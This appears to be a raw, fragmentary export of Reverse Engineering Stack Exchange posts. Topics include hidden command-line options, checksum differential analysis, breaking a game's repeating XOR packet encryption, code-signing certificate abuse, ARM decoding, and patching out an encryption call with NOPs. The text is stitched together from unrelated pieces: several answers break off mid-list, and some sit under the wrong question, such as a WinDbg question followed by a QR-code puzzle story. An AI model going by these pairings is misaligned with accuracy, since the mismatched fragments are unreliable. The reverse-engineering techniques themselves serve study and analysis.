  rather hopeless to me, considering how much work this is</p>
</blockquote>

<p>Typically you don't need to analyze the entire program, but only the entrypoints for user-input. Yes, it's still a lot of work, but if the results are fruitful then that's all that matters.</p>

<blockquote>
  <p>So are malware author just monitoring various sources (bug reporting
  site or similar) in the hope of hearing about such cases to look into
  it?</p>
</blockquote>

<p>Most malware does not propagate via security exploits, but by simple social-engineering (""here, run this .exe""). For malware that does exploit security vulnerabilities, the authors either rely on modules from <a href=""http://www.rapid7.com/db/modules/"">Metasploit</a> or buy exploits from the black market. It's extremely rare for a single person to be both a vulnerability finder <em>and</em> a malware author.</p>

"How to find obfuscated hidden command line parameters?","614","","<p>The Amazon KindleGen command line app (<a href=""https://www.amazon.com/gp/feature.html?docId=1000765211"" rel=""nofollow noreferrer"">Windows, macOS, Linux</a> download links) has several undocumented command line parameters that I'm curious about. One of these hidden command line parameters is:</p>

<pre><code>-dont_append_source
</code></pre>

<p>However, this string can't be found with the <strong>strings</strong> app or any of the many dissassemblers that I tried. It's therefore highly likely that some of the command line parameters have been obfuscated. </p>

<p>There are at least 8 of them:</p>

<pre><code>option: (hidden) Skip the HTML cleanup
option: (hidden) creates json position map file for debugging purpose.
option: (hidden) creates mobi for older devices.
option: (hidden) Using manual(tag based) fragmentation mode for building Webkit reader compatible mobi.
option: (hidden) Webkit reader Compatible mobi will be built
option: (hidden) fragsize
option: (hidden) custom image size will be used for resizing
option: (hidden) amazon creator tool or pipeline

This value is then subtracted from 0xFFF2 to produce the 16th word in the message.</em></p>

<p>In a similar vein, let 'o(Y)' stand for the bit string consisting entirely of zeroes except for value Y at the sixteenth nibble.</p>

<p>Now, let's confront the XOR (bit difference) of certain inputs and the XOR of the corresponding checksums as MSB-first bitstrings:</p>

<pre><code>s(4) ^ s(6) = o(2), cksum delta: .............**.............***.
s(8) ^ s(A) = o(2), cksum delta: ...........****..............**.
s(8) ^ s(C) = o(4), cksum delta: ...........***...............*..
s(4) ^ s(C) = o(8), cksum delta: ...........**...............*...
</code></pre>

<p>The lowest set bit of the checksum differences is equal to the bit where the inputs differ, and there is a matching difference exactly sixteen bits higher. The bursts of set bits could be due to bubbling carries.</p>

<p>For comparison, here are the XOR differences between the corresponding CRC32 values:</p>

<pre><code>s(4) ^ s(6) = o(2), crc32 delta: .*****.*.......***...*..***..*..
s(8) ^ s(A) = o(2), crc32 delta: .*****.*.......***...*..***..*..
s(8) ^ s(C) = o(4), crc32 delta: *.***.**.....*..*****..*...*..*.
s(4) ^ s(C) = o(8), crc32 delta: .***.**.....*..*****..*...*..*.*
</code></pre>

<p>The structure of the changes is completely different and much more complicated. Note the CRC difference for inputs that differ in the same bit (first two lines), and the density of the differences which approaches the theoretical 50%. This is because CRCs have much better diffusion (avalance effect) than simple, empirical checksums.</p>

<p>And now the picture for a hash with near-perfect diffusion (the murmur hash mixer function):</p>

<pre><code>s(4) ^ s(6) = o(2), murmur delta: ..*..*.....**.**..*..*....**..**
s(8) ^ s(A) = o(2), murmur delta: .*.*.*.*.*..*..*.*.*.*.**.*.*.*.
s(8) ^ s(C) = o(4), murmur delta: ..****.*****.******.**.**.******
s(4) ^ s(C) = o(8), murmur delta: .***...***.**...*.*....**.*.**.*
</code></pre>

<p>It is easy to get a feel for the structure of a checksum by observing these differentials for increasingly complex functions: sum, xor, xorshift, some classical hashes.</p>

<p>Then turn the spotlight on your target function. Observe output differences for some fixed inputs, letting single bit flip wander through the string. Observe output differences for single-bit differences at certain fixed positions for a series of different inputs. Let the difference position hop in increments of 8 bits, observe the behaviour. Then try 32-bit hops, observe. If possible, focus initial investigation on the last 32 bits of the input, since their relation to the output is bound to be a lot simpler than that for bits that went through more iterations... The structure of the hash function cannot hide itself from you for long.</p>

<p>That was a look at xor differentials. Depending on the hypothesised structure of the checksum, other experiments are possible. As a real-life example, a few years back I had to deduce various check digit algorithms (similar in nature to the ISBN check digit algorithm) based on sample batches of (mostly) correct specimens. Since these algorithms are based on multiplying digits with certain position-dependent weights, I searched for pairs of numbers that differed only in one single digit apart from the checksum. By fixing certain hypotheses regarding how the sum is turned into a check digit, this allowed my to deduce the weight (1, 2, 3, 4...) for each digit and to identify the correct hypothesis for the sum.</p>

<p>In the case under consideration it is certainly suggestive that the sixteenth nibble and the final nibble of the checksum sum to 12 (0x0C), for the five samples that I used here.</p>

<p>So, the basic idea is to confront input differences with output differences, modulated by one's suspicion regarding the structure of the function that needs to be inferred. Things can get very tricky if sample pairs with minimal differences are scarce. Conversely, if you can produce samples at will (chosen-plaintext attack) then things are looking very good indeed... </p>

"XOR Encryption (XPost from Crypto)","610","","<p>Dear <em>ReverseEngineering</em>@<strong>SE</strong>,</p>

<p><strong>Background information:</strong>
I have reason to believe that an old game I've played is still using their XOR encryption for nearly all in/out-going packets. I also believe that the key used in the encryption scheme remains static when I analyze the packet data, at least the frequency of certain values indicate so.</p>

<p>I know for a fact that previous keys has been 9-byte ASCII keys of length</p>

<p><strong>Problem:</strong>
I am not able to decrypt the packages. I've tried just directly looping the key, XOR'ing the data that is contained in the TCP packages and also tried the following C# function for XOR cryptography (See appendix).</p>

<p>Assuming Vigenere cipher is to be used as basis the previous keys suggest that the length might be 9 characters long.</p>

<p>I do have complete control of what the plaintext (ASCII in this case) of decrypted packages are gonna contain since I can use the chat functionality in the game. Thus I have tried sending the same message and observed the data difference within Wireshark as seen here:</p>

<p>Plaintext as sent in game: </p>

<blockquote>
  <p>TestingTheKeyTestingTheKeyTestingTheKeyTestingTheKey</p>
</blockquote>

<p>In the following snapshots are three packets of the same message. Notice how the length remains the same, further indicating a static key length:</p>

<p>And finally: Hex dumps of the same packets. (See appendix)</p>

","<p>The keys for your three messages appear to be <code>cf7810d22</code>, <code>42096edac</code> and <code>4ea34873a</code> respectively.  (Note: those are 9-byte ASCII text strings, not hex numbers, even though clearly all the characters appear to be hex digits!)</p>

<hr>

<p>OK, so how did I figure that out?</p>

<p>First, before even looking at the code you posted, I just took the messages from your hex dump, converted them back into binary (using a quick Perl script), and XORed them together.  The resulting XORed messages look like this:</p>

<pre><code>$ perl -0777 -E '$a = &lt;&gt;; $b = &lt;&gt;; print $a ^ $b' packet1.dat packet2.dat | xxd
0000000: 0000 0000 0354 5704 0204 5603 5052 5457  .....TW...V.PRTW
0000010: 0402 0456 0350 5254 5704 0204 5603 5052  ...V.PRTW...V.PR
0000020: 5457 0402 0456 0350 5254 5704 0204 5603  TW...V.PRTW...V.
0000030: 5052 5457 0402 0456 0350 5254 573b 6470  PRTW...V.PRTW;dp
0000040: 4f56 b691                                OV..
</code></pre>

<p>XORing the ciphertexts together like this cancels out the plaintext (assuming that it's the same in both messages), leaving just the XOR of the keys.  We can see that there's a clear repeating 9-byte pattern in the XORed data, strongly suggesting that the messages have indeed been encrypted with a repeating 9-byte key.</p>

<p>Now, if that was <em>all</em>, we could find the key simply by taking the known plaintext string <code>TestingTheKeyTestingTheKeyTestingTheKeyTestingTheKey</code>, XORing it with the ciphertext at different positions (since I didn't know exactly where the known plaintext would occur in the encrypted message), and looking for a result that looks like a plausible key.  In crypto jargon, this method is known as <a href=""http://travisdazell.blogspot.in/2012/11/many-time-pad-attack-crib-drag.html"">crib dragging</a>, a term that dates back at least to <a href=""https://en.wikipedia.org/wiki/Bletchley_Park"">Bletchley Park</a> during WWII.</p>

<p>Alas, when I tried that, it didn't yield anything that looked anything like a repeating 9-byte text string, as I expected the key to be.  In fact, there were hardly any printable ASCII characters in the output at all.  Looking more closely at the ciphertext, I noticed that most of its bytes had the high bit set, something that <em>can't</em> happen when you XOR two ASCII characters together.  So clearly there had to be something else going on, too.</p>

<p>At that point, I took a closer look at your (presumably previously reverse-engineered) decryption code, and realized that it actually XORed the message with <em>three</em> different byte streams:</p>

<ol>
<li>the repeating 9-byte key (applied starting from the sixth byte),</li>
<li>the fifth byte of the ciphertext (<code>Incrementor</code>, presumably some kind of a message counter; this is what caused the high bits of each byte to be set, since in your messages it had values from <code>0xAD</code> to <code>0xAF</code>), applied to every following byte, and</li>
<li>a byte value (<code>KeyVal</code>) that starts at zero and is incremented by one every time the key repeats, i.e. every ninth byte after the sixth.</li>
</ol>

<p>(The code also skips step 3 if <code>KeyVal</code> equals <code>Incrementor</code>, presumably to prevent the last two steps from canceling each other out.  That little quirk actually has little if any cryptographic significance, and in any case, it will never happen for these short messages with high <code>Incrementor</code> values.)</p>

<p>Now, conveniently, the XOR operation, like addition, is commutative and associative &mdash; that is, if you XOR two or more bytes together, it doesn't matter which order you do it in: <code>(A XOR B) XOR C == A XOR (B XOR C) == A XOR (C XOR B) == (A XOR C) XOR B == ...</code>.  Thus, since I knew the <code>Incrementor</code> value for each message (since it's given <em>in</em> the encrypted message) and had a pretty solid guess for the repeating key length (which let me calculate <code>KeyVal</code> for each byte), I could just XOR each encrypted byte with those two values, leaving me with <em>just</em> the plaintext XORed with the repeating key.</p>

<p>After that, it was easy enough to discover by crib-dragging that the known plaintext string actually starts two bytes after the beginning of the encrypted portion (and so seven bytes after the beginning of the whole message), and obtain the 9-byte key for each message.</p>

<p>(What I <em>can't</em> tell from just your three sample messages is how those 9-byte key strings actually are generated, or how the game knows which key string to XOR a given message with.  For that, you may need to analyze more message packets and see if you can find any kind of pattern to the keys.)</p>

","<p>Three problems:</p>

<ol>
<li><code>mix_column</code> returns <code>_col</code> (typo underscore?)</li>
<li>The return value of <code>mix_columns</code> just concatenates the columns together like rows instead of slotting them back into columns - effectively transposing the result.</li>
<li><p><code>AESENC</code> takes its parameters and returns its results as columns concatenated together. Your <code>aesenc</code> takes the parameters and returns the results as rows concatenated together:</p>

"Page Directory Pointer Table in WinDbg","607","","<p>The !pte command in WinDbg gives all the information one may need regarding a virtual address (PDE and PTE location and content), but even on systems with PAE it says nothing about the Page Directory Pointer Table. 
I know that I can get the physical base of the PDPT by looking at CR3, and then use the highest 2 bits of the VA as a index in that table to get to the PDPT Entry, but I'm just curious if there is a command that works like !pte when it comes to PAE as it will be a nice tool to verify my address translations step by step. </p>

<p>Also, is there a way to determine MAXPHYADDR? I know it is at most 52. </p>
","<p>for <code>va to phys address translatio</code>n there is a windbg bang command<br>
<code>!vtop 0 &lt; VirtualAddress &gt;</code> .</p>

<p><strong>Update.</strong></p>

<p>Thanks to <a href=""https://reverseengineering.stackexchange.com/users/2318/w-s"">@w s</a> for hints. Today I resolved puzzle. It took 5 to 6 hours. </p>

<p>So, the answer ...</p>

<p>First I googled around and found <a href=""https://digital-forensics.sans.org/blog/2013/05/14/tools-for-examining-xor-obfuscation-for-malware-analysis"" rel=""nofollow noreferrer"">this</a> article. Then I tried XORSearch. After that I got next challenge. I do not post it here but that was web login form. So, I should guess username and password. Luckily in that form was sql injection vulnerability. After successful login it displayed QR code as PNG image. Of course I cannot decode it with scanner. So, I tried various steganography tools. Unsuccessful. Tried more various tools and then I realized that I am digging too deep. Then I printed that QR code. Looked on it couple of minutes. Tried various online QR decoders. All they failed. Googled about QR code error corrections and broken QR code recovery. Found <a href=""http://datagenetics.com/blog/november12013/index.html"" rel=""nofollow noreferrer"">this site</a>. On three corners must be square blocks to identify and then align the code. For my image they did'n. </p>

<p><a href=""https://i.stack.imgur.com/7sAV2.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7sAV2.png"" alt=""QR code (some part removed)""></a> 
I deleted some part of QR code.</p>

<p>So I took black pencil and colored my printed QR code. Tried to scan it. Scanner made one successful scan. But it was some numbers. After I again looked at printed QR code I realized that it looks bad. Then I realized that QR code must reverse colors. And volā. It now looks like normal QR and scanner successfully scanned it. In that picture was another link to text file, where was job contact details. </p>

<p>P.S The only think that I not fully understood is XOR`ing part. But I tried to study that :).</p>
","<p>This is an encrypted message (hex-encoded, your guess is correct). The cipher is very weak.

"How to get notified about IDA database events not covered in the IDA SDK?","605","","<p>In my <a href=""https://reverseengineering.stackexchange.com/questions/1906/how-can-my-plugin-get-notified-of-anterior-or-posterior-comments-and-more-chan"">previous question</a> I had originally asked for this, but since this aspect of the question was completely disregarded, I feel compelled to ask it separately.</p>

<p>There are certain events apparently not covered in the IDA SDK. I learned in the above linked question that anterior and posterior comments are supported, but what about other events such as when I press <kbd>h</kbd> (e.g. <code>2Ah</code> becomes <code>42</code>) to change the number to base 10 (and back) or <kbd>r</kbd> to show it as character (e.g. <code>2Ah</code> becomes <code>*</code>).</p>

<p>How would I go about to catch these?</p>

<p><strong>NB:</strong> in general this question would also relate to IDA versions prior to the ones supporting a particular event notification. E.g. the IDA SDK 6.4, according to Igor, introduced notifications for anterior and posterior comments. How can I get older versions and 6.4 to co-operate w.r.t. those events in conjunction with <a href=""http://sourceforge.net/projects/collabreate/"" rel=""nofollow noreferrer"">collabREate</a>?</p>

<p>I know that it is allowed to reverse engineer IDA itself, so what I am looking for are pointers.</p>
","<p>When I needed to do a similar task I ended up hooking the IDB save event and then scanned the IDB for modifications using the IDA API before each user save. it took about a few seconds to scan the entire function list, aggregating most information for both functions and data elements.</p>

<p>To me, that sounds like a more practical approach than trying to reverse engineer IDA and patching these hooks in, especially when trying to catch UI events such as user hotkeys.</p>

<p>one point to note though, is that aggregating structure/enum data might be difficult if you choose not to rely on IDA's id numbers if you're doing to handle more than one IDB file.</p>

<p>If you do wish to reverse engineer IDA, it'll be very interesting to join a discussion on the topic somewhere.
since IDA now uses Qt for most of it's UI (though I'll guess the migration to Qt wasn't as smooth as one could hope), a great starting point into Qt will be <a href=""http://www.codeproject.com/Articles/31330/Qt-Internals-Reversing"" rel=""nofollow noreferrer"">Daniel Pistelli's Qt Internals and Reversing</a> article, which also includes an IDAPython script at the end (yet reading the entire article is highly recommended).</p>

<p>it's somewhat outdated but assuming IDA uses Qt 4.8.x there aren't many differences (if you'd like I can list the ones I know of).</p>

<p>basically, since Qt is very event-driven (and with some luck IDA 6.0 was designed with that in mind) it might be the case that you just need to listen, in Qt-dialect this is called <code>connect</code>-ing a <code>slot</code> (event handler) to a <code>signal</code> (event), for at-least some of the specific events you wish to hook.</p>

<p>I previously did some moderate Qt-IDA hacks as I call them, using Qt and PyQt to manipulate Qt objects under IDA's application. In the same manner I managed to add and edit menu items and tool bars manually, it is definitely possible to look up the context menu popup when right-clicking in IDA's disassembly view or hooking the hotkeys.</p>

</ol>

<p>It's also not a guard region or a region with special protection flags. It's just a private R+W region.</p>

<p>I suspect that they are somehow raising an exception whenever that piece of memory is read. I'm looking to understand what they're doing and how to detect it, or at the very least, make RPM not crash the application.</p>

<p>P.S. I cannot attach a debugger to this application, and the executable is encrypted, but I do know that various TLS callbacks are used along with VEH exception handlers.</p>
","<p>Alright, it would appear that we have an answer to this. And it's a lot simpler than I thought, and actually pretty cool.</p>

<p>Basically, they allocate some pages with no physical backing until the page is accessed. This means that any access whatsoever (even in kernel mode) will validate the page, thus allowing the application to see that the page has been validated and promptly crash the game.</p>

<p>I can't say for certain that this is the correct answer, but it fits my analysis.

"How do malware steal Code signing certificates?","603","","<p>While analyzing/studying/RE  exe's/dll's  you  see the certificates in peview/hexeditor etc. but how does one come to know that the certificate is a fake/malicious/expired one, there has to be a central repository of all the good or bad certificates,one which I know of is HerdProtect[.]com which tells you if the company/developer is known to distribute malware.</p>

<p>Plus, I have read that people steal code signing certificates from companies and use them to sign their malware, my question is while reversing what strings should I look for in Olly/IDA ,I'm guessing the malware will be enumerating using FindFirstFile, FindNextFile etc. for a specific file(certificate file) in the system what string do such malware look for, <strong>""OR  HAVE I GOT IT WRONG""</strong>.</p>

<p>Also many exe's are signed twice why so?Is it to fool security vendors or is it normal to sign with multiple certificates.</p>
","<p>For an executable with a digital certificate, it's easy enough to check for the certificate's information and origin by looking at the executable's properties. For example, here's what is shown for Skype:</p>

<p><a href=""https://i.stack.imgur.com/jO6he.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/jO6he.png"" alt=""enter image description here""></a></p>

<p>These certificates are issued to a developer from a trusted Certification Authority (CA) and are used to sign the executable before distributing it. In theory, the CA should fully verify the identity of the developer applying for a certificate before issuing one, but in practice a CA is still a system involving imperfect entities and it's possible for a malware author to apply for and receive a ""good"" certificate from a trusted CA while never producing anything but malware.</p>

<p>If you refer back to the first image of the Skype certificates and select ""Details"", you'll be able to get more information about the certificate and its origin:</p>

<p><a href=""https://i.stack.imgur.com/G9VaH.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/G9VaH.png"" alt=""enter image description here""></a></p>

<p>In this image, we can see exactly who the certificate was issued to and who issued it, along with relevant issue date and expiration information. This is a direct download from the official Skype site, so I can be pretty confident that the software was made by who it says. Likewise, the certificate was issued by the Microsoft Code Signing PCA, so we can be at least reasonably confident that the certificate is trustworthy. If you look at the ""Certification Path"" tab, you can trace the certificate all the way back to the root CA and again verify that everything looks as it should.</p>

<p>Determining whether or not the certificate is malicious or stolen can be difficult to detect, but is somewhat a matter of common sense. Does your certificate claim to be issued to a legitimate publisher (e.g., Microsoft) but you know that the software you downloaded is not from them? Something may be amiss. You can also look at the issuing CA and try to find information online about their reputation. Does the CA do a bad job of screening out people who distribute malware? Do they have a reputation for poor information security? If the issuer seems sketchy, then they very well may be. Relying on the reputation of CAs is a known vulnerability.</p>

<p>Now, as to your second question: the certificate consists of a private/public key pair, with the private key kept private (of course) and the public key distributed with the application. Using a code signing tool, a developer generates a hash of the executable and encrypts it with the private key. This hash is distributed with the public key portion of the certificate in the executable. On the user's end, a new hash of the executable is taken and decrypted with the public key to verify its integrity. This means that executables that have been modified after having been signed won't have a valid certificate and you should get a warning when trying to install or run them. If you want to see a list of certificates on your system (both trusted and untrusted), open up a command prompt window and run <code>certmgr</code></p>

<p>Note that in order for a legitimate certificate to be ""stolen"" and malware to sign itself with it, it would need access to the private key. If the private key is exposed (<a href=""https://www.kb.cert.org/vuls/id/925497"" rel=""nofollow noreferrer"">like what happened to Dell several years ago...</a>) then it is possible for a malware author to sign their software as if they were the developer to whom the certificate was issued. If this private key is kept private, then it should theoretically be safe. I think the answer to your second question is that you're a bit confused as to how code signing works, but if you <em>did</em> manage to come across a bit of malware that was attempting to generate signed code, I would keep an eye out for sections of code attempting to launch a <code>signtool</code> instance, loading a <code>.pfx</code> or other private key file, etc.</p>

<p>I am not an expert on code signing or certification authorities, so it's possible that there are cases where malware generates self-signed certificates, messes with root CAs on the system, etc., but someone more experienced than me would have to weigh in on that...</p>

<p>As for the dual-signing in your third question, it would be helpful to see an example of what you're talking about, but I did find that Skype is signed with two certificates. The primary difference between the two is the digest algorithm, with one being sha1 and the other sha256. This is likely a mechanism to deal with legacy users who have an operating system for which sha256 is not currently supported and require the older (and deprecated) sha1 digest algorithm. (see: <a href=""https://security.stackexchange.com/questions/109629/deprecation-of-sha1-code-signing-certificates-on-windows"">https://security.stackexchange.com/questions/109629/deprecation-of-sha1-code-signing-certificates-on-windows</a>)</p>

So my questions are: Is there any tool that knows to do this conversion? If not, does someone have general knowledge about the whereabouts of native code in dex files (if it is there)?</p>
","<p>No, native code isn't in classes.dex. If an android apk file has native code, the apk itself, when unzipping, should have a <code>lib</code> subdirectory, which may have architecture-dependent subdirectories  <code>armeabi</code>. <code>armeabi-v7a</code>. <code>x86</code> and possibly others, and those will contain the native code objects. Sometimes, shared objects may be in other directories as well, especially if they belong to some libraries the application linked in.</p>

<p>For example, i unzipped the apk of one application that i know to have native code:</p>

<pre><code>$ unzip -l net.skoobe.reader-1.apk

"What is the correct disassembly for ARM7 opcode E1F120D1?","601","","<p>I'm writing a disassembler for ARM opcodes and I'm struggling with a particular encoding. The offending instruction is <code>E1F120D1</code>. I think I've followed the instructions closely, and expect the disassemble to be <code>mvns r2,r1</code> but trying it on <a href=""http://www.onlinedisassembler.com"" rel=""nofollow"">http://www.onlinedisassembler.com</a> gives me <code>ldsrb r2,[r1,#1]!</code>. </p>

<p>It seems like the low-order <code>20D1</code> in the instruction is causing online disassembler ti switch from <code>mvn</code> to <code>ldrsb</code>. Is this a bug in the disassembler -- not likely -- or my misunderstanding the instruction encodings in the manual?</p>
","<p>If you look at the ARM Architecture Reference Manual, you should be able to see that Chapter A5 takes you through the decoding of ARM instructions.</p>

<p>Starting with table A5-1, your instruction has -</p>

<pre><code>cond (31-28) = 1110
op1 (27-25) =  000
</code></pre>

<p>This matches </p>

<pre><code>cond = not 1111, op1 = 00x  =&gt; Data Processing &amp; Miscellaneous instructions (A5.2)
</code></pre>

<p>Then for table A5-2 in section A5.2, your instruction has -</p>

<pre><code>op (25) = 0
op1 (24-20) = 11111
op2 (7-4) = 1101
</code></pre>

<p>The encoding that matches these bits is -</p>

<pre><code>op = 0, op1 = not 0xx1x, op2 = 11x1 =&gt; Extra load/store instructions (A5.2.8)
</code></pre>

<p>Finally for table A5-10 in section A5.2.8, your instruction has -</p>

<pre><code>op2 (6-5) = 10
op1 (24-20) = 11111
Rn (19-16) = 0001
</code></pre>

<p>This matches</p>

<pre><code>op2 = 10, op1 = xx1x1, Rn = not 1111 =&gt; LDRSB (immediate)
</code></pre>

<p>So, yes, bits 7-4 definitely affect the decoding of this instruction.</p>

"Reversing encryption by analysing executable","599","","<p>I have a program that reads data from a file, parses/organizes it, and spits it out as an encrypted XML. The application can also take an encrypted XML and spit out the original file. My objective at this point would be to access the clear-text XML (I'm not interested in the clear text original file as it's not XML organized)</p>

<p>I have no idea what the encryption is yet although one guy on a forum said it was AES-128 (not sure how he got to that conclusion).</p>

<p>I ran PEiD with the KANAL plugin on the application, it doesn't detect any encryption signatures.</p>

<p>Because I have access to the program and some past some experience with exploiting BO on WinXP with some knowledge of ASM, I figured I could give it a try using a debugger.</p>

<p>In a nutshell, what are the general steps I should be following to figure this out? In this situation would it be best to start looking for the encryption key itself, or find a way to use the application's encrypt/decrypt functions to my advantage?</p>
","<p>There are typically many ways to start, and which one you want to use depends on your experience. Also, what works for one target might fail on another, and vice versa. What i'd start with is:</p>

<ul>
<li>Use signsrch to check if the executable has a standard encryption algorithm linked in. Note that this might yield false positives (if the application links openssl, for example, you might find signatures of many algorithms even if only one or two of them get used)</li>
<li>Check for strings in the file that relate to encryption, and google for them. Maybe this helps to find which encryption library was used. For example, the string <code>SHA-%d test #%d:</code> quickly leads to the <code>polarssl</code> source code.</li>
<li>Trace the application while running procmon. You will probably find a sequence of <code>CreateFile</code>, multiple <code>WriteFile</code> and a <code>CloseFile</code> call, when writing the encrypted file, and the same with <code>ReadFile</code> when reading the encrypted file. In some cases, the parameters of these calls give you a hint already; for example, if the first <code>WriteFile</code> has a byte count of 32, and every following call 4096, this could be a hint that the first 32 bytes are a 256-bit key.</li>
<li>Check the stack when a call to <code>ReadFile</code> or <code>WriteFile</code> happens, You can do this by placing a breakpoint there while running the application under a debugger, or (much easier imho) look at the stack for several of the <code>procmon</code> calls. This gives you a hint of which chain of functions encrypts the file and writes it.</li>
<li><p>Pay attention to the stack differences in the <code>CreateFile</code>, <code>WriteFile</code> on the encrypted file, and possibly <code>WriteFile</code> on something else. These might as well give you hint which is your encryption function. For example:</p>

<ul>
<li>The <code>CreateFile</code> for the encrypted file has the stack <code>ABCDEFGH</code></li>
<li>The <code>WriteFile</code> for the encrypted file has the stack <code>ABCIJKLM</code></li>
<li>The <code>WriteFile</code> for something else has the stack <code>ABNOPKLM</code></li>
</ul>

<p>where each letter is one stack entry. In this case, i'd assume <code>KLM</code> to be part of the runtime library (<code>fwrite</code>, <code>write</code>, ....), since unrelated <code>WriteFile</code>s share it, <code>C</code> to be the main writer function (as it's the last to call <code>CreateFile</code> and <code>WriteFile</code>), and <code>I</code> and <code>J</code> the functions that encrypt and write.</p></li>
<li>Load the file into IDA, or OllyDbg, and have a closer look at <code>C</code>, <code>I</code> and <code>J</code>. Which other functions do they call? Are some of these functions the same ones you identified with signsrch earlier?</li>
<li>Run the file under the control of IDA, or OllyDbg, and place breakpoints on <code>C</code>, <code>I</code>, <code>J</code>, and maybe some of the functions you found with signsrch. Check the parameters on entry and exit from these functions. Do some of them ring a bell? Does one of the functions has a parameter that is a pointer to a buffer which looks like XML before the function is called, and garbage after it's called? Or vice versa when reading? Congrats, you've just found the function that does the encryption.</li>
<li>When you found the function that does the encryption, instead of figuring out how it works, it <em>might</em> just be easier to replace the call to it with a series of <code>NOP</code>s (beware of return codes though, maybe you need to set <code>eax</code> to something). Bingo, you have a program that writes plain XML instead of encrypted XML now, without ever figuring out the details of the encryption and having to write one single line of code (unless you consider a series of <code>NOP</code>s code, that is).</li>

","<p><strong>System calls vs. function calls</strong></p>

<blockquote>
  <p>I mean, I know they are system calls, also printf along with scanf, strcmp are C functions.</p>
</blockquote>

<p>Many C library functions are wrappers around system calls. <code>printf</code> and <code>scanf</code> are are examples of this. However, it should not be assumed that all C library functions execute system calls, as none of the <code>string.h</code> library functions, including <code>strcmp</code>,  execute any system calls.</p>

<blockquote>
  <p>A system call is a controlled entry point into the kernel, allowing a process to request that the kernel perform some action on the process’s behalf. The kernel makes a range of services accessible to programs via the system call application programming interface (API).<sup>1</sup></p>
</blockquote>

<p>The mechanism by which system calls are made is quite different than by that which function calls are made:</p>

<blockquote>
  <p>The [C library] wrapper function executes a trap machine instruction (<code>int 0x80</code>), which causes the processor to switch from user mode to kernel mode and execute code pointed to by location <code>0x80</code> (128 decimal) of the system’s trap vector.</p>
  
  <p>More recent x86-32 architectures implement the <code>sysenter</code> instruction, which provides a faster method of entering kernel mode than the conventional int <code>0x80</code> trap instruction. The use of <code>sysenter</code> is supported in the 2.6 kernel and from glibc 2.3.2 onward.<sup>1</sup></p>
</blockquote>

<p>Here is a visual depiction of the C library function <a href=""http://man7.org/linux/man-pages/man2/execve.2.html"" rel=""nofollow noreferrer""><code>execve</code></a> being executed, in which <code>execve</code> makes a system call:</p>

<p><strong>x86 calling conventions</strong></p>

<p>When a function is called, flow of control branches to a different location in memory via the <code>call</code> instruction:</p>

<blockquote>
  <p>Saves procedure linking information on the stack and branches to the procedure (called procedure) specified with the destination (target) operand. The target operand specifies the address of the first instruction in the called procedure. This operand can be an immediate value, a general purpose register, or a memory location.<sup><a href=""https://c9x.me/x86/html/file_module_x86_id_26.html"" rel=""nofollow noreferrer"">2</a></sup></p>

<blockquote>
  <p>But my question is where do they get the parameters from?</p>
</blockquote>

<p>Arguments are pushed onto the stack in reverse order of their corresponding parameters in the function definition prior to the function call. The return value is saved in <code>%eax</code>. This is in accordance with x86 calling convention, referred to as <a href=""https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow noreferrer"">cdecl</a>:</p>

<blockquote>
  <p><strong>Caller Rules</strong></p>
  
  <p>To make a subrouting call, the caller should:</p>
  
  <ol>
  <li><p>Before calling a subroutine, the caller should save the contents of certain registers that are designated caller-saved. The caller-saved registers are EAX, ECX, EDX. Since the called subroutine is allowed to modify these registers, if the caller relies on their values after the subroutine returns, the caller must push the values in these registers onto the stack (so they can be restore after the subroutine returns.</p></li>
  <li><p><strong>To pass arguments to the subroutine, push them onto the stack before the call. The arguments should be pushed in inverted order (i.e. last argument first).</strong> Since the stack grows down, the first arguments will be stored at the lowest address (this inversion of arguments was historically used to allow functions to be passed a variable number of parameters).</p></li>
  <li><p>To call the subroutine, use the call instruction. This instruction places the return address on top of the arguments on the stack, and branches to the subroutine code. This invokes the subroutine, which should follow the callee rules below.</p></li>
  </ol>
  
  <p><strong>After the subroutine returns (immediately following the call instruction), the caller can expect to find the return value of the subroutine in the register EAX</strong>. To restore the machine state, the caller should:</p>
  
  <ol>
  <li>Remove the arguments from stack. This restores the stack to its state before the call was performed.</li>
  <li>Restore the contents of caller-saved registers (EAX, ECX, EDX) by popping them off of the stack. The caller can assume that no other registers were modified by the subroutine. <sup><a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html#calling"" rel=""nofollow noreferrer"">3</a></sup></li>

<p><strong><code>__stack_chk_fail</code> and stack guards</strong></p>

<blockquote>
  <p>And also, what does the call sym.imp.__stack_chk_fail does?</p>
</blockquote>

<p><code>__stack_chk_fail</code> is called when the <a href=""https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries"" rel=""nofollow noreferrer"">stack canary</a> has been overwritten due to a buffer overflow:</p>

<blockquote>
  <p>The basic idea behind stack protection is to push a ""canary"" (a randomly chosen integer) on the stack just after the function return pointer has been pushed. The canary value is then checked before the function returns; if it has changed, the program will abort. Generally, stack buffer overflow (aka ""stack smashing"") attacks will have to change the value of the canary as they write beyond the end of the buffer before they can get to the return pointer. Since the value of the canary is unknown to the attacker, it cannot be replaced by the attack. Thus, the stack protection allows the program to abort when that happens rather than return to wherever the attacker wanted it to go.<sup><a href=""https://lwn.net/Articles/584225/"" rel=""nofollow noreferrer"">4</a></sup></p>

<p>I want to do this in a Python script without rewriting what already works.</p>

<p>I have looked for a way to find a list of the commands I have performed through the GUI menus, but export data is not the sort of thing that appears in an IDC file.</p>

<p>To me it seems as if the easiest and cleanest solution here is to simply call <code>idaapi.get_many_bytes</code> to get the buffer of data you're interesting in dumping, and then format it however you'd like.</p>

<p>for example, the following code snippet will output the binary data as a hexadecimal string:</p>

<pre><code>buf = idaapi.get_many_bytes(start, end)
buf.encode('hex')

There are no sections in this file.

<p>Considering the segments:</p>

<pre><code># readelf --segments SimpleVM

Elf file type is EXEC (Executable file)
Entry point 0xc023dc

<p>I observe that the first segments <code>LOAD</code> has size <code>0x13c7</code> bytes, and mapped into memory at <code>0xc01000</code>; the second one is not important because its size is zero. But, the entry point of the ELF file is at <code>0xc023dc</code>, that means outside any segment <code>LOAD</code>!!!</p>

<p>I use also IDA 6.8 (evaluation ver.) to load this file, and IDA says that the entry point is illegal.</p>

